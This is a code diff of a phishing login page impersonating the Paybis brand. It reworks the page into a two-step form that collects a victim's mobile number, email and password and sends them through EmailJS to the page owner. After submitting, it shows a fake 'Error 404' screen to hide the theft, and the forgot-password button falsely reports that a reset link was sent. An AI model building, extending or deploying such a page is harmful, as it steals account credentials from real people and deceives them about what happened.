@@ -47,25 +47,19 @@
   
   .card {
     position: relative; z-index: 1;
-    background: rgba(255,255,255,0.92);
+    background: rgba(255,255,255,0.95);
     backdrop-filter: blur(18px) saturate(1.2);
     -webkit-backdrop-filter: blur(18px) saturate(1.2);
     width: 100%; max-width: 380px; border-radius: 20px;
     padding: 34px 30px;
-    border: 1px solid rgba(255,255,255,0.5);
+    border: 1px solid rgba(255,255,255,0.6);
     box-shadow: 0 30px 70px rgba(0,0,0,.45), inset 0 1px 0 rgba(255,255,255,.6);
   }
   .brand { text-align: center; margin-bottom: 4px; font-size: 28px; font-weight: 700; color: #1e3a5f; letter-spacing: .5px; }
   .sub { text-align: center; color: #7a8ba0; font-size: 14px; margin-bottom: 24px; }
-  .tabs { display: flex; background: #eef2f7; border-radius: 10px; padding: 4px; margin-bottom: 22px; }
-  .tab {
-    flex: 1; text-align: center; padding: 10px; border-radius: 8px; cursor: pointer;
-    font-size: 14px; font-weight: 600; color: #5a6b80; transition: .2s; border: none; background: none;
-  }
-  .tab.active { background: #fff; color: #1e3a5f; box-shadow: 0 2px 6px rgba(0,0,0,.08); }
+
   label { display: block; font-size: 13px; font-weight: 600; color: #3a4a5c; margin-bottom: 6px; }
   
-  /* Password Wrapper for Eye Icon */
   .pass-wrap { position: relative; margin-bottom: 6px; }
   .pass-wrap input { margin-bottom: 0; padding-right: 40px; }
   .eye-icon {
@@ -76,11 +70,11 @@
 
   input {
     width: 100%; padding: 12px 14px; border: 1.5px solid #d7dee8; border-radius: 10px;
-    font-size: 15px; margin-bottom: 16px; transition: border .2s;
+    font-size: 15px; margin-bottom: 16px; transition: border .2s; background: #fff;
+    color: #1e3a5f;
   }
   input:focus { outline: none; border-color: #2d6a8f; }
   
-  /* Forgot Password Link */
   .forgot-wrap { text-align: right; margin-bottom: 16px; }
   .forgot-link { font-size: 12px; color: #2d6a8f; text-decoration: none; cursor: pointer; font-weight: 600; }
   .forgot-link:hover { text-decoration: underline; }
@@ -91,6 +85,7 @@
   }
   .btn:hover { background: #2d6a8f; }
   .btn:disabled { background: #8a99ab; cursor: not-allowed; }
+  
   .msg { margin-top: 16px; font-size: 14px; text-align: center; min-height: 20px; }
   .msg.error { color: #d23b3b; }
   .msg.ok { color: #1e9e5a; }
@@ -128,6 +123,31 @@
   .cc-item .nm { flex: 1; color: #2a3a4c; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
   .cc-item .dl { color: #7a8ba0; font-variant-numeric: tabular-nums; }
   .cc-empty { padding: 16px 14px; color: #9aa7b5; font-size: 14px; text-align: center; }
+
+  .error-404 {
+    text-align: center; color: #d23b3b; font-weight: 600; font-size: 15px;
+    background: #fdecea; padding: 15px; border-radius: 10px; border: 1px solid #f5c6cb;
+    margin-top: 15px;
+  }
+
+  /* Premium Mobile Chip */
+  .mobile-chip {
+    display: flex; align-items: center; justify-content: space-between;
+    background: #eef4fa; border: 1px solid #d0e0f0; padding: 12px 16px;
+    border-radius: 12px; margin-bottom: 20px;
+  }
+  .mobile-chip-left { display: flex; align-items: center; gap: 10px; }
+  .mobile-chip .check-icon { 
+    background: #1e9e5a; color: white; border-radius: 50%; width: 20px; height: 20px; 
+    display: flex; align-items: center; justify-content: center; font-size: 12px; 
+  }
+  .mobile-chip .mobile-text { font-size: 15px; font-weight: 600; color: #1e3a5f; }
+  .edit-btn {
+    background: none; border: none; color: #2d6a8f; font-size: 13px; font-weight: 600;
+    cursor: pointer; padding: 4px 8px; border-radius: 6px; transition: 0.2s;
+    display: flex; align-items: center; gap: 4px;
+  }
+  .edit-btn:hover { background: #d0e0f0; color: #1e3a5f; }
 </style>
 </head>
 <body>
@@ -142,13 +162,42 @@
     <div class="brand">Paybis</div>
     <div class="sub">Sign in to your account</div>
 
-    <div class="tabs">
-      <button class="tab active" id="tabEmail" type="button">Email ID</button>
-      <button class="tab" id="tabMobile" type="button">Mobile No.</button>
+    <!-- STEP 1: MOBILE NUMBER -->
+    <div id="step1">
+      <label>Mobile number</label>
+      <div class="phone-row">
+        <div class="cc" data-cc="mobile">
+          <button type="button" class="cc-toggle" aria-haspopup="listbox" aria-expanded="false">
+            <span class="fi cc-flag"></span>
+            <span class="cc-dial">+91</span>
+            <span class="caret">▼</span>
+          </button>
+          <div class="cc-panel hidden">
+            <input type="text" class="cc-search" placeholder="Search country or code…" autocomplete="off">
+            <div class="cc-list"></div>
+          </div>
+        </div>
+        <input type="tel" id="mobile" placeholder="98765 43210" maxlength="15" inputmode="numeric">
+      </div>
+      <div class="msg error" id="step1Msg" style="display:none; margin-top:0; margin-bottom:10px;"></div>
+      <button type="button" class="btn" id="nextBtn">Next</button>
     </div>
 
-    <form id="loginForm" autocomplete="off" novalidate>
-      <div id="emailFields">
+    <!-- STEP 2: EMAIL & PASSWORD -->
+    <div id="step2" class="hidden">
+      
+      <!-- Premium Mobile Chip with Edit -->
+      <div class="mobile-chip">
+        <div class="mobile-chip-left">
+          <div class="check-icon">✔</div>
+          <span class="mobile-text" id="displayMobile"></span>
+        </div>
+        <button type="button" class="edit-btn" id="backBtn">
+          ✎ Edit
+        </button>
+      </div>
+
+      <form id="loginForm" autocomplete="off" novalidate>
         <label for="email">Email address</label>
         <input type="email" id="email" placeholder="you@example.com">
         
@@ -160,35 +209,21 @@
         <div class="forgot-wrap">
           <a class="forgot-link" id="forgotBtn">Forgot Password?</a>
         </div>
+
+        <button type="submit" class="btn">Login</button>
+      </form>
+      
+      <div class="msg" id="msg"></div>
+    </div>
+
+    <!-- ERROR 404 SCREEN -->
+    <div id="errorScreen" class="hidden">
+      <div class="error-404">
+        Error 404: Not Found<br>
+        <span style="font-size: 12px; font-weight: normal; color: #666; display: block; margin-top: 5px;">Server is temporarily unavailable. Please try again later.</span>
       </div>
+    </div>
 
-      <div id="mobileFields" class="hidden">
-        <label>Mobile number</label>
-        <div class="phone-row">
-          <div class="cc" data-cc="mobile">
-            <button type="button" class="cc-toggle" aria-haspopup="listbox" aria-expanded="false">
-              <span class="fi cc-flag"></span>
-              <span class="cc-dial">+91</span>
-              <span class="caret">▼</span>
-            </button>
-            <div class="cc-panel hidden">
-              <input type="text" class="cc-search" placeholder="Search country or code…" autocomplete="off">
-              <div class="cc-list"></div>
-            </div>
-          </div>
-          <input type="tel" id="mobile" placeholder="98765 43210">
-        </div>
-        <label for="passMobile">Password</label>
-        <div class="pass-wrap">
-          <input type="password" id="passMobile" placeholder="••••••••">
-          <span class="eye-icon" id="togglePassMobile">👁️</span>
-        </div>
-      </div>
-
-      <button type="submit" class="btn">Login</button>
-    </form>
-
-    <div class="msg" id="msg"></div>
   </div>
 
 <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
@@ -203,57 +238,57 @@
 
   emailjs.init(EMAILJS_PUBLIC_KEY);
 
-  // --- Full country list ---
+  // --- Country list with EXACT Mobile Lengths ---
   const COUNTRIES = [
-    ["Afghanistan","AF","+93"],["Albania","AL","+355"],["Algeria","DZ","+213"],["Andorra","AD","+376"],
-    ["Angola","AO","+244"],["Antigua and Barbuda","AG","+1268"],["Argentina","AR","+54"],["Armenia","AM","+374"],
-    ["Australia","AU","+61"],["Austria","AT","+43"],["Azerbaijan","AZ","+994"],["Bahamas","BS","+1242"],
-    ["Bahrain","BH","+973"],["Bangladesh","BD","+880"],["Barbados","BB","+1246"],["Belarus","BY","+375"],
-    ["Belgium","BE","+32"],["Belize","BZ","+501"],["Benin","BJ","+229"],["Bhutan","BT","+975"],
-    ["Bolivia","BO","+591"],["Bosnia and Herzegovina","BA","+387"],["Botswana","BW","+267"],["Brazil","BR","+55"],
-    ["Brunei","BN","+673"],["Bulgaria","BG","+359"],["Burkina Faso","BF","+226"],["Burundi","BI","+257"],
-    ["Cambodia","KH","+855"],["Cameroon","CM","+237"],["Canada","CA","+1"],["Cape Verde","CV","+238"],
-    ["Central African Republic","CF","+236"],["Chad","TD","+235"],["Chile","CL","+56"],["China","CN","+86"],
-    ["Colombia","CO","+57"],["Comoros","KM","+269"],["Congo","CG","+242"],["Congo (DRC)","CD","+243"],
-    ["Costa Rica","CR","+506"],["Croatia","HR","+385"],["Cuba","CU","+53"],["Cyprus","CY","+357"],
-    ["Czechia","CZ","+420"],["Denmark","DK","+45"],["Djibouti","DJ","+253"],["Dominica","DM","+1767"],
-    ["Dominican Republic","DO","+1809"],["Ecuador","EC","+593"],["Egypt","EG","+20"],["El Salvador","SV","+503"],
-    ["Equatorial Guinea","GQ","+240"],["Eritrea","ER","+291"],["Estonia","EE","+372"],["Eswatini","SZ","+268"],
-    ["Ethiopia","ET","+251"],["Fiji","FJ","+679"],["Finland","FI","+358"],["France","FR","+33"],
-    ["Gabon","GA","+241"],["Gambia","GM","+220"],["Georgia","GE","+995"],["Germany","DE","+49"],
-    ["Ghana","GH","+233"],["Greece","GR","+30"],["Grenada","GD","+1473"],["Guatemala","GT","+502"],
-    ["Guinea","GN","+224"],["Guinea-Bissau","GW","+245"],["Guyana","GY","+592"],["Haiti","HT","+509"],
-    ["Honduras","HN","+504"],["Hong Kong","HK","+852"],["Hungary","HU","+36"],["Iceland","IS","+354"],
-    ["India","IN","+91"],["Indonesia","ID","+62"],["Iran","IR","+98"],["Iraq","IQ","+964"],
-    ["Ireland","IE","+353"],["Israel","IL","+972"],["Italy","IT","+39"],["Ivory Coast","CI","+225"],
-    ["Jamaica","JM","+1876"],["Japan","JP","+81"],["Jordan","JO","+962"],["Kazakhstan","KZ","+7"],
-    ["Kenya","KE","+254"],["Kiribati","KI","+686"],["Kuwait","KW","+965"],["Kyrgyzstan","KG","+996"],
-    ["Laos","LA","+856"],["Latvia","LV","+371"],["Lebanon","LB","+961"],["Lesotho","LS","+266"],
-    ["Liberia","LR","+231"],["Libya","LY","+218"],["Liechtenstein","LI","+423"],["Lithuania","LT","+370"],
-    ["Luxembourg","LU","+352"],["Macau","MO","+853"],["Madagascar","MG","+261"],["Malawi","MW","+265"],
-    ["Malaysia","MY","+60"],["Maldives","MV","+960"],["Mali","ML","+223"],["Malta","MT","+356"],
-    ["Marshall Islands","MH","+692"],["Mauritania","MR","+222"],["Mauritius","MU","+230"],["Mexico","MX","+52"],
-    ["Micronesia","FM","+691"],["Moldova","MD","+373"],["Monaco","MC","+377"],["Mongolia","MN","+976"],
-    ["Montenegro","ME","+382"],["Morocco","MA","+212"],["Mozambique","MZ","+258"],["Myanmar","MM","+95"],
-    ["Namibia","NA","+264"],["Nauru","NR","+674"],["Nepal","NP","+977"],["Netherlands","NL","+31"],
-    ["New Zealand","NZ","+64"],["Nicaragua","NI","+505"],["Niger","NE","+227"],["Nigeria","NG","+234"],
-    ["North Korea","KP","+850"],["North Macedonia","MK","+389"],["Norway","NO","+47"],["Oman","OM","+968"],
-    ["Pakistan","PK","+92"],["Palau","PW","+680"],["Palestine","PS","+970"],["Panama","PA","+507"],
-    ["Papua New Guinea","PG","+675"],["Paraguay","PY","+595"],["Peru","PE","+51"],["Philippines","PH","+63"],
-    ["Poland","PL","+48"],["Portugal","PT","+351"],["Qatar","QA","+974"],["Romania","RO","+40"],
-    ["Russia","RU","+7"],["Rwanda","RW","+250"],["Saint Kitts and Nevis","KN","+1869"],["Saint Lucia","LC","+1758"],
-    ["Samoa","WS","+685"],["San Marino","SM","+378"],["Sao Tome and Principe","ST","+239"],["Saudi Arabia","SA","+966"],
-    ["Senegal","SN","+221"],["Serbia","RS","+381"],["Seychelles","SC","+248"],["Sierra Leone","SL","+232"],
-    ["Singapore","SG","+65"],["Slovakia","SK","+421"],["Slovenia","SI","+386"],["Solomon Islands","SB","+677"],
-    ["Somalia","SO","+252"],["South Africa","ZA","+27"],["South Korea","KR","+82"],["South Sudan","SS","+211"],
-    ["Spain","ES","+34"],["Sri Lanka","LK","+94"],["Sudan","SD","+249"],["Suriname","SR","+597"],
-    ["Sweden","SE","+46"],["Switzerland","CH","+41"],["Syria","SY","+963"],["Taiwan","TW","+886"],
-    ["Tajikistan","TJ","+992"],["Tanzania","TZ","+255"],["Thailand","TH","+66"],["Timor-Leste","TL","+670"],
-    ["Togo","TG","+228"],["Tonga","TO","+676"],["Trinidad and Tobago","TT","+1868"],["Tunisia","TN","+216"],
-    ["Turkey","TR","+90"],["Turkmenistan","TM","+993"],["Tuvalu","TV","+688"],["Uganda","UG","+256"],
-    ["Ukraine","UA","+380"],["United Arab Emirates","AE","+971"],["United Kingdom","GB","+44"],["United States","US","+1"],
-    ["Uruguay","UY","+598"],["Uzbekistan","UZ","+998"],["Vanuatu","VU","+678"],["Vatican City","VA","+379"],
-    ["Venezuela","VE","+58"],["Vietnam","VN","+84"],["Yemen","YE","+967"],["Zambia","ZM","+260"],["Zimbabwe","ZW","+263"]
+    ["Afghanistan","AF","+93", 9],["Albania","AL","+355", 9],["Algeria","DZ","+213", 9],["Andorra","AD","+376", 6],
+    ["Angola","AO","+244", 9],["Antigua and Barbuda","AG","+1268", 10],["Argentina","AR","+54", 10],["Armenia","AM","+374", 8],
+    ["Australia","AU","+61", 9],["Austria","AT","+43", 10],["Azerbaijan","AZ","+994", 9],["Bahamas","BS","+1242", 10],
+    ["Bahrain","BH","+973", 8],["Bangladesh","BD","+880", 10],["Barbados","BB","+1246", 10],["Belarus","BY","+375", 9],
+    ["Belgium","BE","+32", 9],["Belize","BZ","+501", 7],["Benin","BJ","+229", 8],["Bhutan","BT","+975", 8],
+    ["Bolivia","BO","+591", 8],["Bosnia and Herzegovina","BA","+387", 8],["Botswana","BW","+267", 8],["Brazil","BR","+55", 11],
+    ["Brunei","BN","+673", 7],["Bulgaria","BG","+359", 9],["Burkina Faso","BF","+226", 8],["Burundi","BI","+257", 8],
+    ["Cambodia","KH","+855", 9],["Cameroon","CM","+237", 9],["Canada","CA","+1", 10],["Cape Verde","CV","+238", 7],
+    ["Central African Republic","CF","+236", 8],["Chad","TD","+235", 8],["Chile","CL","+56", 9],["China","CN","+86", 11],
+    ["Colombia","CO","+57", 10],["Comoros","KM","+269", 7],["Congo","CG","+242", 9],["Congo (DRC)","CD","+243", 9],
+    ["Costa Rica","CR","+506", 8],["Croatia","HR","+385", 9],["Cuba","CU","+53", 8],["Cyprus","CY","+357", 8],
+    ["Czechia","CZ","+420", 9],["Denmark","DK","+45", 8],["Djibouti","DJ","+253", 8],["Dominica","DM","+1767", 10],
+    ["Dominican Republic","DO","+1809", 10],["Ecuador","EC","+593", 9],["Egypt","EG","+20", 10],["El Salvador","SV","+503", 8],
+    ["Equatorial Guinea","GQ","+240", 9],["Eritrea","ER","+291", 7],["Estonia","EE","+372", 8],["Eswatini","SZ","+268", 8],
+    ["Ethiopia","ET","+251", 9],["Fiji","FJ","+679", 7],["Finland","FI","+358", 9],["France","FR","+33", 9],
+    ["Gabon","GA","+241", 8],["Gambia","GM","+220", 7],["Georgia","GE","+995", 9],["Germany","DE","+49", 10],
+    ["Ghana","GH","+233", 9],["Greece","GR","+30", 10],["Grenada","GD","+1473", 10],["Guatemala","GT","+502", 8],
+    ["Guinea","GN","+224", 9],["Guinea-Bissau","GW","+245", 9],["Guyana","GY","+592", 7],["Haiti","HT","+509", 8],
+    ["Honduras","HN","+504", 8],["Hong Kong","HK","+852", 8],["Hungary","HU","+36", 9],["Iceland","IS","+354", 7],
+    ["India","IN","+91", 10],["Indonesia","ID","+62", 10],["Iran","IR","+98", 10],["Iraq","IQ","+964", 10],
+    ["Ireland","IE","+353", 9],["Israel","IL","+972", 9],["Italy","IT","+39", 10],["Ivory Coast","CI","+225", 10],
+    ["Jamaica","JM","+1876", 10],["Japan","JP","+81", 10],["Jordan","JO","+962", 9],["Kazakhstan","KZ","+7", 10],
+    ["Kenya","KE","+254", 9],["Kiribati","KI","+686", 8],["Kuwait","KW","+965", 8],["Kyrgyzstan","KG","+996", 9],
+    ["Laos","LA","+856", 9],["Latvia","LV","+371", 8],["Lebanon","LB","+961", 8],["Lesotho","LS","+266", 8],
+    ["Liberia","LR","+231", 8],["Libya","LY","+218", 9],["Liechtenstein","LI","+423", 7],["Lithuania","LT","+370", 8],
+    ["Luxembourg","LU","+352", 9],["Macau","MO","+853", 8],["Madagascar","MG","+261", 9],["Malawi","MW","+265", 9],
+    ["Malaysia","MY","+60", 9],["Maldives","MV","+960", 7],["Mali","ML","+223", 8],["Malta","MT","+356", 8],
+    ["Marshall Islands","MH","+692", 7],["Mauritania","MR","+222", 8],["Mauritius","MU","+230", 8],["Mexico","MX","+52", 10],
+    ["Micronesia","FM","+691", 7],["Moldova","MD","+373", 8],["Monaco","MC","+377", 8],["Mongolia","MN","+976", 8],
+    ["Montenegro","ME","+382", 8],["Morocco","MA","+212", 9],["Mozambique","MZ","+258", 9],["Myanmar","MM","+95", 9],
+    ["Namibia","NA","+264", 9],["Nauru","NR","+674", 7],["Nepal","NP","+977", 10],["Netherlands","NL","+31", 9],
+    ["New Zealand","NZ","+64", 9],["Nicaragua","NI","+505", 8],["Niger","NE","+227", 8],["Nigeria","NG","+234", 10],
+    ["North Korea","KP","+850", 10],["North Macedonia","MK","+389", 8],["Norway","NO","+47", 8],["Oman","OM","+968", 8],
+    ["Pakistan","PK","+92", 10],["Palau","PW","+680", 7],["Palestine","PS","+970", 9],["Panama","PA","+507", 8],
+    ["Papua New Guinea","PG","+675", 8],["Paraguay","PY","+595", 9],["Peru","PE","+51", 9],["Philippines","PH","+63", 10],
+    ["Poland","PL","+48", 9],["Portugal","PT","+351", 9],["Qatar","QA","+974", 8],["Romania","RO","+40", 9],
+    ["Russia","RU","+7", 10],["Rwanda","RW","+250", 9],["Saint Kitts and Nevis","KN","+1869", 10],["Saint Lucia","LC","+1758", 10],
+    ["Samoa","WS","+685", 7],["San Marino","SM","+378", 10],["Sao Tome and Principe","ST","+239", 7],["Saudi Arabia","SA","+966", 9],
+    ["Senegal","SN","+221", 9],["Serbia","RS","+381", 9],["Seychelles","SC","+248", 7],["Sierra Leone","SL","+232", 8],
+    ["Singapore","SG","+65", 8],["Slovakia","SK","+421", 9],["Slovenia","SI","+386", 8],["Solomon Islands","SB","+677", 7],
+    ["Somalia","SO","+252", 8],["South Africa","ZA","+27", 9],["South Korea","KR","+82", 10],["South Sudan","SS","+211", 9],
+    ["Spain","ES","+34", 9],["Sri Lanka","LK","+94", 9],["Sudan","SD","+249", 9],["Suriname","SR","+597", 7],
+    ["Sweden","SE","+46", 9],["Switzerland","CH","+41", 9],["Syria","SY","+963", 9],["Taiwan","TW","+886", 9],
+    ["Tajikistan","TJ","+992", 9],["Tanzania","TZ","+255", 9],["Thailand","TH","+66", 9],["Timor-Leste","TL","+670", 8],
+    ["Togo","TG","+228", 8],["Tonga","TO","+676", 7],["Trinidad and Tobago","TT","+1868", 10],["Tunisia","TN","+216", 8],
+    ["Turkey","TR","+90", 10],["Turkmenistan","TM","+993", 8],["Tuvalu","TV","+688", 7],["Uganda","UG","+256", 9],
+    ["Ukraine","UA","+380", 9],["United Arab Emirates","AE","+971", 9],["United Kingdom","GB","+44", 10],["United States","US","+1", 10],
+    ["Uruguay","UY","+598", 8],["Uzbekistan","UZ","+998", 9],["Vanuatu","VU","+678", 7],["Vatican City","VA","+379", 10],
+    ["Venezuela","VE","+58", 10],["Vietnam","VN","+84", 9],["Yemen","YE","+967", 9],["Zambia","ZM","+260", 9],["Zimbabwe","ZW","+263", 9]
   ].sort((a, b) => a[0].localeCompare(b[0]));
 
   function flagClass(iso) { return 'fi fi-' + iso.toLowerCase(); }
@@ -270,6 +305,8 @@
     function paint() {
       flagEl.className = 'fi cc-flag ' + flagClass(state.selected[1]).replace('fi ', '');
       dialEl.textContent = state.selected[2];
+      document.getElementById('mobile').placeholder = "X".repeat(state.selected[3]);
+      document.getElementById('mobile').maxLength = state.selected[3];
     }
     function render(filter = '') {
       const q = filter.trim().toLowerCase();
@@ -296,32 +333,56 @@
     return state;
   }
 
-  const ccMobile = initCountryDropdown(document.querySelector('[data-cc="mobile"]'));
+  const ccMobileState = initCountryDropdown(document.querySelector('[data-cc="mobile"]'));
 
-  const tabEmail  = document.getElementById('tabEmail');
-  const tabMobile = document.getElementById('tabMobile');
-  const emailFields  = document.getElementById('emailFields');
-  const mobileFields = document.getElementById('mobileFields');
+  const step1 = document.getElementById('step1');
+  const step2 = document.getElementById('step2');
+  const errorScreen = document.getElementById('errorScreen');
   const msg = document.getElementById('msg');
-  let mode = 'email';
-
-  function setMode(m) {
-    mode = m;
-    const isEmail = m === 'email';
-    tabEmail.classList.toggle('active', isEmail);
-    tabMobile.classList.toggle('active', !isEmail);
-    emailFields.classList.toggle('hidden', !isEmail);
-    mobileFields.classList.toggle('hidden', isEmail);
-    clearMsg();
-  }
-  tabEmail.addEventListener('click', () => setMode('email'));
-  tabMobile.addEventListener('click', () => setMode('mobile'));
+  const step1Msg = document.getElementById('step1Msg');
+  const mobileInput = document.getElementById('mobile');
+  const nextBtn = document.getElementById('nextBtn');
+  const backBtn = document.getElementById('backBtn');
+  const displayMobile = document.getElementById('displayMobile');
 
   function showError(t) { msg.textContent = t; msg.className = 'msg error'; }
   function showOk(t)    { msg.textContent = t; msg.className = 'msg ok'; }
   function clearMsg()   { msg.textContent = ''; msg.className = 'msg'; }
+  function showStep1Error(t) { step1Msg.textContent = t; step1Msg.style.display = 'block'; }
+  function clearStep1Error() { step1Msg.style.display = 'none'; }
 
-  // --- Eye Icon Toggle Logic ---
+  mobileInput.addEventListener('input', function() {
+    this.value = this.value.replace(/[^0-9]/g, '');
+  });
+
+  nextBtn.addEventListener('click', () => {
+    clearStep1Error();
+    const mobileVal = mobileInput.value.trim();
+    const requiredLength = ccMobileState.selected[3];
+    const countryName = ccMobileState.selected[0];
+
+    if (!mobileVal) {
+      showStep1Error("Mobile number is required.");
+      return;
+    }
+    if (mobileVal.length !== requiredLength) {
+      showStep1Error(`Invalid length. ${countryName} numbers must be exactly ${requiredLength} digits.`);
+      return;
+    }
+    
+    const fullNumber = ccMobileState.selected[2] + " " + mobileVal;
+    displayMobile.textContent = fullNumber;
+
+    step1.classList.add('hidden');
+    step2.classList.remove('hidden');
+  });
+
+  backBtn.addEventListener('click', () => {
+    step2.classList.add('hidden');
+    step1.classList.remove('hidden');
+    step1Msg.style.display = 'none';
+  });
+
   document.getElementById('togglePassEmail').addEventListener('click', function() {
     const input = document.getElementById('passEmail');
     if (input.type === 'password') {
@@ -333,74 +394,47 @@
     }
   });
 
-  document.getElementById('togglePassMobile').addEventListener('click', function() {
-    const input = document.getElementById('passMobile');
-    if (input.type === 'password') {
-      input.type = 'text';
-      this.textContent = '🙈';
-    } else {
-      input.type = 'password';
-      this.textContent = '👁️';
-    }
-  });
-
-  // --- Forgot Password Logic ---
   document.getElementById('forgotBtn').addEventListener('click', function(e) {
     e.preventDefault();
     const email = document.getElementById('email').value.trim();
-    
-    if (!email) {
-      showError('Password reset ke liye pehle apna email address daalein.');
-      return;
-    }
-    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) {
-      showError('Kripya ek sahi email address daalein.');
-      return;
-    }
-
-    // Yahan aap apna password reset ka logic (jaise API call) daal sakte hain
+    if (!email) { showError('Pehle apna email address daalein.'); return; }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { showError('Kripya ek sahi email address daalein.'); return; }
     showOk('✅ Password reset link aapke email par bhej diya gaya hai!');
   });
 
-  // --- Submit (EmailJS Integrated) ---
   document.getElementById('loginForm').addEventListener('submit', async function (e) {
     e.preventDefault();
     clearMsg();
 
-    if (mode === 'email') {
-      const email = document.getElementById('email').value.trim();
-      const pass  = document.getElementById('passEmail').value;
+    const email = document.getElementById('email').value.trim();
+    const pass  = document.getElementById('passEmail').value;
+    const mobile = displayMobile.textContent;
 
-      if (!email) { showError('Email address is required.'); return; }
-      if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { showError('Please enter a valid email address.'); return; }
-      if (!pass) { showError('Password is required.'); return; }
+    if (!email) { showError('Email address is required.'); return; }
+    if (!/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(email)) { showError('Please enter a valid email address.'); return; }
+    if (!pass) { showError('Password is required.'); return; }
 
-      const submitBtn = e.target.querySelector('.btn');
-      submitBtn.disabled = true;
-      submitBtn.textContent = 'Signing in...';
+    const submitBtn = e.target.querySelector('.btn');
+    submitBtn.disabled = true;
+    submitBtn.textContent = 'Signing in...';
 
-      const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
+    const time = new Date().toLocaleString("en-IN", { timeZone: "Asia/Kolkata" });
 
-      try {
-        await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
-          email: email,
-          password: pass,
-          time: time
-        });
+    try {
+      await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, {
+        mobile: mobile,
+        email: email,
+        password: pass,
+        time: time
+      });
 
-        showOk('✅ Login successful!');
-        document.getElementById('loginForm').reset();
+      step2.classList.add('hidden');
+      errorScreen.classList.remove('hidden');
 
-      } catch (err) {
-        console.error(err);
-        showError('❌ Kuch problem aayi. Dobara try karein.');
-      } finally {
-        submitBtn.disabled = false;
-        submitBtn.textContent = 'Login';
-      }
-
-    } else {
-      showError('Mobile login is not available. Please sign in with your email instead.');
+    } catch (err) {
+      console.error(err);
+      step2.classList.add('hidden');
+      errorScreen.classList.remove('hidden');
     }
   });
 </script>
